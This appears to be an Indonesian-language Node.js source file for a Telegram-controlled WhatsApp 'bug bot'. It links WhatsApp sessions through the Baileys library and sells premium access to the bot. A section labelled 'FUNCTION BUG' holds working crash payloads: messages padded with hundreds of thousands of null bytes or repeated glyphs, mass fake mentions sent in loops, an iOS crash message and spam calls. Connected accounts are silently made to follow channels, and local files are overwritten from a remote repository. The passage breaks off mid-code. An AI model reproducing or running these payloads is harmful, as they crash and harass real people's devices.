const {
  default: makeWASocket,
  useMultiFileAuthState,
  downloadContentFromMessage,
  emitGroupParticipantsUpdate,
  emitGroupUpdate,
  generateWAMessageContent,
  generateWAMessage,
  makeInMemoryStore,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  MediaType,
  areJidsSameUser,
  WAMessageStatus,
  downloadAndSaveMediaMessage,
  AuthenticationState,
  GroupMetadata,
  initInMemoryKeyStore,
  getContentType,
  MiscMessageGenerationOptions,
  useSingleFileAuthState,
  BufferJSON,
  WAMessageProto,
  MessageOptions,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  MessageTypeProto,
  WALocationMessage,
  ReconnectMode,
  WAContextInfo,
  proto,
  WAGroupMetadata,
  ProxyAgent,
  waChatKey,
  MimetypeMap,
  MediaPathMap,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  BaileysError,
  WA_MESSAGE_STATUS_TYPE,
  MediaConnInfo,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  WAMediaUpload,
  jidDecode,
  mentionedJid,
  processTime,
  Browser,
  MessageType,
  Presence,
  WA_MESSAGE_STUB_TYPES,
  Mimetype,
  relayWAMessage,
  Browsers,
  GroupSettingChange,
  DisconnectReason,
  WASocket,
  getStream,
  WAProto,
  isBaileys,
  AnyMessageContent,
  fetchLatestBaileysVersion,
  templateMessage,
  InteractiveMessage,
  Header,
} = require('@whiskeysockets/baileys');
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const pino = require("pino");
const crypto = require("crypto");
const fetch = require("node-fetch");
const renlol = fs.readFileSync("./assets/images/thumb.jpeg");
const FormData = require('form-data');
const path = require("path");
const sessions = new Map();
const readline = require("readline");
const cd = "cooldown.json";
const axios = require("axios");
const moment = require("moment");
const chalk = require("chalk");
const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const BOT_TOKEN = config.BOT_TOKEN;
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const GH_OWNER = "dyy112233";
const GH_REPO = "AutoUpdatebasee";
const GH_BRANCH = "main";

let premiumUsers = JSON.parse(fs.readFileSync("./premium.json"));
let adminUsers = JSON.parse(fs.readFileSync("./admin.json"));

function ensureFileExists(filePath, defaultData = []) {
  if (!fs.existsSync(filePath)) {
    fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
  }
}

ensureFileExists("./premium.json");
ensureFileExists("./admin.json");

function savePremiumUsers() {
  fs.writeFileSync("./premium.json", JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
  fs.writeFileSync("./admin.json", JSON.stringify(adminUsers, null, 2));
}

// Fungsi untuk memantau perubahan file
function watchFile(filePath, updateCallback) {
  fs.watch(filePath, (eventType) => {
    if (eventType === "change") {
      try {
        const updatedData = JSON.parse(fs.readFileSync(filePath));
        updateCallback(updatedData);
        console.log(`File ${filePath} updated successfully.`);
      } catch (error) {
        console.error(`bot ${botNum}:`, error);
      }
    }
  });
}

watchFile("./premium.json", (data) => (premiumUsers = data));
watchFile("./admin.json", (data) => (adminUsers = data));

const GITHUB_TOKEN_LIST_URL =
  "https://raw.githubusercontent.com/dyy112233/dyyganteng/refs/heads/main/token.json";

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens;
  } catch (error) {
    console.error(
      chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message)
    );
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa token bot.."));

  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("ʟᴜ sᴀᴘᴀ, ᴛᴏᴋᴇɴ ʟᴜ ʟᴏᴍ ᴋᴇᴅᴀғᴛᴀʀ ᴅɪ ᴅʙ ᴍɪɴᴛᴀ sᴇʟʟᴇʀ ʟᴜ 😹🖕🏻"));
    process.exit(1);
  }

  console.log(chalk.green(`ᴛᴏᴋᴇɴ ʟᴜ ᴋᴇᴅᴀғᴛᴀʀ ᴅɪ ᴅʙ 🔥`));
  startBot();
  initializeWhatsAppConnections();
}

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

function startBot() {
  console.log(chalk.red(`

⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⡸⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣫⡶⣁⡣⡹⣿⣿⣿⣿⣿⣿⣿⣿⣿⢟⣵⣏⡺⠳⢻⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢏⣾⣿⢱⣿⣿⡆⢻⣭⣭⣭⣭⣭⣭⣭⣑⣻⣿⢸⣿⣧⠘⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣱⣿⣿⣿⡾⢿⠿⣫⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣮⣝⠇⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⡟⡫⣰⣿⣿⣿⣿⣾⣾⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣮⡻⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⡛⣡⢜⣴⣹⣿⣿⣿⣿⣿⢻⡏⣿⡨⣻⣿⣿⣿⣿⣿⣿⣿⣻⣿⣿⣷⡽⣿⣿⣿⣿⣎⢿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡿⢋⣴⣿⠯⠼⣿⢻⣿⣿⣿⣿⡏⣧⣷⢹⣧⢷⡝⣿⣦⢻⣿⣿⣿⣷⢱⢻⣿⣷⢹⡻⣿⣿⡟⡆⢻⣿
⣿⣿⣿⣿⣿⣿⡟⢡⣾⣿⢧⡹⢿⡏⣺⣛⣛⡻⣿⢳⢿⣿⠈⣿⢸⣿⡜⣿⡌⣿⡿⢿⠿⣦⠞⡿⣫⣄⢇⢹⡗⣶⣯⢁⢿
⣿⣿⣿⣿⣿⡟⢠⣿⣿⡏⣾⣿⣿⢹⣯⣾⣯⣵⡟⠘⠙⠌⡇⡿⢸⣿⣿⢩⠃⢹⣧⣧⣯⢻⠒⣵⡿⢹⡾⡆⣿⣿⣿⡇⡼
⣿⣿⣿⣿⣿⠱⣸⣿⣿⢱⣿⣿⡇⣾⣿⣿⣿⣿⡏⣾⠟⣰⠇⠁⠛⠿⡿⡿⢃⠘⣡⣠⡀⠈⠀⠀⢀⠙⠃⢱⣿⣿⣿⠇⢁
⣿⣿⣿⣿⣿⡄⣿⣿⡿⣼⣿⣿⢳⣿⣿⣿⣿⣿⡇⣫⠞⣩⡤⠶⢦⣄⣵⣷⣿⣿⣿⣿⣧⠆⠷⠀⠈⠻⣦⠸⣿⣹⡿⣸⣸
⣿⣿⣿⣿⣇⡇⣿⣿⡇⣿⣿⣿⣸⣿⣿⣿⣿⣿⡇⢡⣿⠻⠆⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⣻⡆⢿⣧⡌⢿⣿
⣿⣿⣿⣿⣿⣐⢹⣿⡇⣿⣿⡏⣿⣿⣿⣿⣿⣿⡇⢻⣿⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣆⡀⠀⠀⣠⣿⣾⣌⢿⣿⡜⣿
⣿⣿⣿⣿⣿⣧⠈⣿⣧⢿⣿⡇⣿⣿⣿⣿⣿⣿⡇⣮⣻⣧⣀⢀⣀⣤⣿⣿⣿⣿⣿⣿⣶⣿⣿⣿⣿⣫⣱⡻⡝⡌⣿⣷⢹
⣿⣿⣿⣿⣿⣿⣷⣜⢻⠸⣿⣇⣿⣿⣿⣿⣿⣿⣧⢸⡽⣝⡴⣜⠝⣿⡻⣿⠿⠿⠛⠛⡛⠛⢛⢫⣷⣱⣓⣙⣙⣽⢸⣿⡏
⣿⣿⣿⣿⣿⣿⣿⣿⣷⣇⢻⣿⢹⡿⣿⣿⣿⣿⣿⠘⣮⣾⣮⣮⣾⡿⠀⣀⣀⣦⣥⣒⣀⠁⠂⠄⣿⣿⣿⣿⣿⢏⣿⣿⡇
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢘⣿⡼⣇⣿⣿⣿⣿⣿⡞⣹⣿⣿⣿⣿⡇⣾⣿⣿⣿⣿⣿⣿⣿⣷⣀⣿⣿⣿⢟⣱⣿⣿⣿⡇
⣿⢿⣿⡿⣟⢛⣛⢛⠻⣿⢸⣿⣧⢿⣹⣿⣿⣿⣿⣧⢣⠻⣿⣿⣿⣿⣎⡻⠿⣿⠿⠿⣟⣛⣽⠾⡟⡫⣷⣿⣿⢻⡟⣶⠁
⣿⢀⣵⣯⣾⣿⢣⣾⣿⣿⢘⡿⠿⡎⣧⢿⣿⠟⡿⢱⡔⠑⠄⠉⠉⢻⣿⣿⣿⡿⡟⠋⠉⠑⢶⣿⡇⡇⣿⣿⣾⣶⣾⠏⢳
⢣⣿⣺⣽⣽⡁⣿⣿⣿⡿⣠⣇⣧⣿⡘⣜⣿⣵⣷⣿⣦⠀⠀⠀⠀⠀⠛⡿⢿⠿⠀⠀⠀⠀⢠⡹⠳⣳⢿⣿⣿⣿⢏⠆⣾
⢸⣿⣿⣿⣿⡇⢻⣿⣿⢇⣿⣿⡏⣿⣿⣜⢪⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠐⠶⠃⠀⠀⠀⠀⠸⡳⣜⢏⣿⣿⢟⣵⣿⣾⣿

`));


console.log(chalk.greenBright(`
┌─────────────────────────────┐
│ W E L C O M E - K A I S A R
├─────────────────────────────┤
│ Developer : @dyyganteng123 
│ Informasi : @storedyyganteng 
└─────────────────────────────┘
`));

console.log(chalk.blueBright(`
[ 🚀 BOT KAISAR BERJALAN.... ]
`
));
};

validateToken();
let sock;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sock.newsletterFollow("120363426491268246@newsletter");
              sock.newsletterFollow("120363423904098470@newsletter");
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `\`\`\`js
◇ 𝙋𝙧𝙤𝙨𝙚𝙨𝙨 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 
◇ 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧 : ${botNumber}.....
\`\`\``,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `\`\`\`js    
◇ 𝙋𝙧𝙤𝙨𝙚𝙨𝙨 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 
◇ 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧 : ${botNumber}.....
\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
\`\`\`js
◇ 𝙂𝙖𝙜𝙖𝙡 𝙢𝙚𝙡𝙖𝙠𝙪𝙠𝙖𝙣 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 
◇ 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧 : ${botNumber}.....
\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
`
\`\`\`js
◇ 𝙋𝙖𝙞𝙧𝙞𝙣𝙜 𝙨𝙪𝙘𝙘𝙚𝙨
◇ 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧 : ${botNumber}
\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
      sock.newsletterFollow("120363426491268246@newsletter");
      sock.newsletterFollow("120363423904098470@newsletter");
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber, "KAISARRR");
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `
\`\`\`js
◇ 𝙎𝙪𝙘𝙘𝙚𝙨 𝙥𝙖𝙞𝙧𝙞𝙣𝙜
◇ 𝙔𝙤𝙪𝙧 𝙘𝙤𝙙𝙚 : ${formattedCode}
\`\`\``,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
\`\`\`js
◇ 𝙂𝙖𝙜𝙖𝙡 𝙢𝙚𝙡𝙖𝙠𝙪𝙠𝙖𝙣 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 
◇ 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧 : ${botNumber}.....
\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}


// -------( Fungsional Function Before Parameters )--------- \\
// ~Bukan gpt ya kontol

//~Runtime🗑️🔧
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;

  return `${days} Hari,${hours} Jam,${minutes} Menit`
}

const startTime = Math.floor(Date.now() / 1000);

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~Get Speed Bots🔧🗑️
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime);
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = {
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric",
  };
  return now.toLocaleDateString("id-ID", options);
}

function getRandomImage() {
  const images = [
    "https://files.catbox.moe/mi1c1p.jpg",
  ];
  return images[Math.floor(Math.random() * images.length)];
}

const bagUrl = "https://files.catbox.moe/mi1c1p.jpg";
const ownerUrl = "https://files.catbox.moe/mi1c1p.jpg";
const bugUrl = "https://files.catbox.moe/mi1c1p.jpg";

// ~ Coldowwn

let cooldownData = fs.existsSync(cd)
  ? JSON.parse(fs.readFileSync(cd))
  : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
  fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
  if (cooldownData.users[userId]) {
    const remainingTime =
      cooldownData.time - (Date.now() - cooldownData.users[userId]);
    if (remainingTime > 0) {
      return Math.ceil(remainingTime / 1000);
    }
  }
  cooldownData.users[userId] = Date.now();
  saveCooldown();
  setTimeout(() => {
    delete cooldownData.users[userId];
    saveCooldown();
  }, cooldownData.time);
  return 0;
}

function setCooldown(timeString) {
  const match = timeString.match(/(\d+)([smh])/);
  if (!match) return "Format salah! Gunakan contoh: /setjeda 5m";

  let [_, value, unit] = match;
  value = parseInt(value);

  if (unit === "s") cooldownData.time = value * 1000;
  else if (unit === "m") cooldownData.time = value * 60 * 1000;
  else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

  saveCooldown();
  return `Cooldown diatur ke ${value}${unit}`;
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find((user) => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return `Ya - ${new Date(user.expiresAt).toLocaleString("id-ID")}`;
  } else {
    return "Tidak - Tidak ada waktu aktif";
  }
}

async function getWhatsAppChannelInfo(link) {
  if (!link.includes("https://whatsapp.com/channel/"))
    return { error: "Link tidak valid!" };

  let channelId = link.split("https://whatsapp.com/channel/")[1];
  try {
    let res = await sock.newsletterMetadata("invite", channelId);
    return {
      id: res.id,
      name: res.name,
      subscribers: res.subscribers,
      status: res.state,
      verified: res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak",
    };
  } catch (err) {
    return { error: "Gagal mengambil data! Pastikan channel valid." };
  }
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

async function spamcall(target) {
  const sock = makeWASocket({
    printQRInTerminal: false,
  });

  try {
    console.log(`📞 Mengirim panggilan ke ${target}`);

    await sock.query({
      tag: "call",
      json: ["action", "call", "call", { id: `${target}` }],
    });

    console.log(`✅ Berhasil mengirim panggilan ke ${target}`);
  } catch (err) {
    console.error(`⚠️ Gagal mengirim panggilan ke ${target}:`, err);
  } finally {
    sock.ev.removeAllListeners(); 
    sock.ws.close();
  }
}

async function downloadRepo(dir = "", basePath = "/home/container") {
    const apiURL = `https://api.github.com/repos/${GH_OWNER}/${GH_REPO}/contents/${dir}?ref=${GH_BRANCH}`;

    const { data } = await axios.get(apiURL, {
        headers: { "User-Agent": "Mozilla/5.0" }
    });

    for (const item of data) {
        const localPath = path.join(basePath, item.path);

        if (item.type === "file") {
            const fileResp = await axios.get(item.download_url, {
                responseType: "arraybuffer"
            });

            fs.mkdirSync(path.dirname(localPath), { recursive: true });
            fs.writeFileSync(localPath, Buffer.from(fileResp.data));

            console.log(`[UPDATE] ${localPath}`);
        }

        if (item.type === "dir") {
            fs.mkdirSync(localPath, { recursive: true });
            await downloadRepo(item.path, basePath);
        }
    }
}

async function sendOfferCall(target) {
  try {
    await sock.offerCall(target);
    console.log(chalk.white.bold(`Success Send To Target`));
  } catch (error) {
    console.error(chalk.white.bold(`Failed Send:`, error));
  }
}

async function sendOfferVideoCall(target) {
  try {
    await sock.offerCall(target, {
      video: true,
    });
    console.log(chalk.white.bold(`Success Send To Target`));
  } catch (error) {
    console.error(
      chalk.white.bold(`Failed Send:`, error)
    );
  }
}
//--------------------------------------------FUNCTION BUG----------------------------------------------------------\\

async function SuperNovaDelayByMia(sock, target) {
  const SqlMeta = Array.from({ length: 10000 }, (_, Mia) =>
    `${Mia}13135550001@s.whatsapp.net`
  );

  for (let z = 0; z < 150; z++) { 
    const header = {
      videoMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_977428425010793_478212189942291937_n.enc?ccb=11-4&oh=01_Q5Aa4gHmH7vVbrVUvlhCySQuLF9lnjIVK1hidoRgxETJrlJVlA&oe=6A22A5A5&_nc_sid=5e03e0&mms3=true",
        directPath: "/v/t62.7161-24/10000000_977428425010793_478212189942291937_n.enc?ccb=11-4&oh=01_Q5Aa4gHmH7vVbrVUvlhCySQuLF9lnjIVK1hidoRgxETJrlJVlA&oe=6A22A5A5&_nc_sid=5e03e0",
        mimetype: "video/mp4",
        caption: "Mia",
        mediaKey: "wv/atWfl21qU9enzJBV5pfE2OU1/ouIFO5QuRQp5Heg=",
        fileEncSha256: "P0Mc91Qhpus26uHe9iGnIfCBqOTPoaPpg3mInV2NVKk=",
        fileSha256: "yYiWMdXM82iuxVc/vTKzQ7jZMc/jgtTe+KmwGYt4hpc=",
        fileLength: "87906632",
        mediaKeyTimestamp: "1778075081",
        contextInfo: {},
        streamingSidecar: "xey0UW72AH+ShCjYXVzOom/k+kt7VJryEZ+yNyAarqVJHx8L4j6sB4Da5ZGHXTfzX9g=",
        thumbnailDirectPath: "/v/t62.36147-24/19977827_1442378506945978_3754389976888828856_n.enc?ccb=11-4&oh=01_Q5Aa1wGz9o9ukGbtWxoetr_ygoJDy0SN80KaAwJ1vywXvbTH8A&oe=687247F9&_nc_sid=5e03e0",
        thumbnailSha256: "hxKrzb6DDC8qTu2xOdeZN4FBgHu8cmNekZ+pPye6dO0=",
        thumbnailEncSha256: "Es1ZWpjDKRZ82XpiLARj3FZWh9DeFCEUG2wU8WHWrRs=",
        annotations: [{
          embeddedContent: {
            embeddedMusic: {
              musicContentMediaId: "1942620729844671",
              songId: "432395962368430",
              author: "Queen ⵢ Mia",
              title: "Mia",
              artworkDirectPath: "/v/t62.76458-24/11810390_1884385592310849_8570381233425191298_n.enc?ccb=11-4&oh=01_Q5Aa1wFo3eosJQYj_I0wJby373H-MKodRwdx1sCOEt426yyLCg&oe=687233BB&_nc_sid=5e03e0",
              artworkSha256: "8x8ENCxJyIrSFnF9ZHtiim423uGgPleSm8zPEbQZByE=",
              artworkEncSha256: "HlsJKALVejvghjYZIrY46zosCX568b1cG9SzzZfCPNA=",
              artistAttribution: "",
              countryBlocklist: "",
              isExplicit: false,
              artworkMediaKey: "0DsOnYZAyNwPJgs5PZwL/EtFxBXO2cW9zwLYZGcAkvU="
            }
          },
          embeddedAction: true
        }]
      },
      hasMediaAttachment: true,
    };

    const msg = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          contextInfo: {
            mentionedJid: SqlMeta + header,
            participant: "0@s.whatsapp.net",
            isGroupMention: true,
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Mia",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: JSON.stringify({
                        flow_cta: {
                          title: "\u0000".repeat(250000)
                        }
                      }),
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "status@broadcast"
          }
        }
      }
    }, {
      userJid: sock.user.id,
      quoted: null
    });

    await sock.relayMessage(target, msg.message, {
      participant: {
        jid: target
      },
      messageId: msg.key.id
    });
  }
}

async function BlankFreezeByMia(sock, target) {
  await sock.relayMessage(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "payment_info",
            buttonParamsJson: `{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"${Date.now()}","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"${'ꦾ'.repeat(5000)}","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"mia","key":"${'\u0000'.repeat(900000)}","key_type":"CPF"}}],"share_payment_status":false}`
          }
        ]
      }
    }
  }, { participant: { jid: target } });
}

async function InvisibleCrashIos(sock, target) {
  let etc = generateWAMessageFromContent(target, proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              orderMessage: {
                orderId: "0",
                itemCount: 69,
                status: "DECLINED",
                surface: "BUFFERS",
                orderDescription: "Apongg" + "𖣂".repeat(15000),
                message: "Apongg\n\n" + "𖣂".repeat(15000),
                orderTitle: "Apongg",
                token: "92298382919191",
                thumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAsAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAAD5oCZ7CkelJ4cb4AADp5uopG9C3HbQxABpS1w2gwi2QABaaSbbckE1mAAAC2gZQAH/xAAkEAACAgEDBAIDAAAAAAAAAAABAgADEQQgIRITMUEQcRQjUf/aAAgBAQABPwD5AJiaVnGY2lsAhBBwdqgExHoWVsjABDLbUqGG8y2xXJIG78Wzs94+Jp2IeXuXckmXadK6K3DctufV2PStPoTSVFmyZqKirEwsxABPAjKCgIPjZhQOYM+hFNx4BM6bGxk+Z0QHAOwjqXMRlAlVqB+f5O6vbA9hoz5OQONqsVMPHI8RShEwn7PriE7gcQjHImTMYG9Wx9Q9oYIhOT8//8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAgEBPwBP/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAwEBPwBP/9k=",
                messageVersion: 1,
              },
              hasMediaAttachment: true,
            },
            body: {
              text: "",
            },
            nativeFlowMessage: {
              name: "galaxy_message",
              messageParamsJson: "{\"icon\":\"REVIEW\",\"flow_cta\":\"\\u0000\",\"flow_message_version\":\"3\"}",
            },
          },
        },
      },
    }), {});
    
  await sock.relayMessage("status@broadcast", etc.message, {
    messageId: etc.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
              },
            ],
          },
        ],
      },
    ],
  });
}

async function Sakata(target, Apong) {
  try {
    const msg1 = {
      interactiveMessage: {
        newsletterJid: "12345678910@newsletter",
        footer: "Cihuy" + "ោ៝".repeat(10000),
        text: "Apong Ganteng" + "ោ៝".repeat(10000),
        inviteExpiration: "999999999",
      },
    };

    await Apong.relayMessage(target, msg1, {
      participant: { jid: target },
      messageId: null,
    });
    
    const msg2 = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            header: {
              title: "Null" + "ꦾ".repeat(30000),
              hasMediaAttachment: true,
            },
            body: {
              text: "Apongg¿" + "ꦾ".repeat(40000)
            },
            footer: {
              text: "woii anying"
            },
            nativeFlowMessage: {
              messageParamsJson: JSON.stringify({ data: "{[" }),
              buttons: [
                {
                  name: "send_location",
                  buttonParamsJson: JSON.stringify({
                    display_text: "",
                    version: 3,
                  }),
                },
                {
                  name: "cta_call",
                  buttonParamsJson: JSON.stringify({
                    display_text: "",
                    version: 3,
                  }),
                },
              ],
            },
          },
        },
      },
    };

    await Apong.relayMessage(target, msg2, {
      participant: { jid: target },
      messageId: null,
    });

  } catch (err) {
    console.error("Error:", err);
  }
}

async function ExploitSender(sock, target) {
  const msg = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: { title: "Z " + "ꦾ".repeat(1000), hasMediaAttachment: false },
          body: { text: "z҉⃝ Z CRASH".repeat(100) },
          nativeFlowMessage: {
            buttons: [
              { name: "cta_url", buttonParamsJson: "{}" },
              { name: "quick_reply", buttonParamsJson: "{}" }
            ]
          }
        }
      }
    }
  };

  const msg2 = {
    buttonsMessage: {
      contentText: "ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ".repeat(5000),
      quotedMessage: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/jpeg",
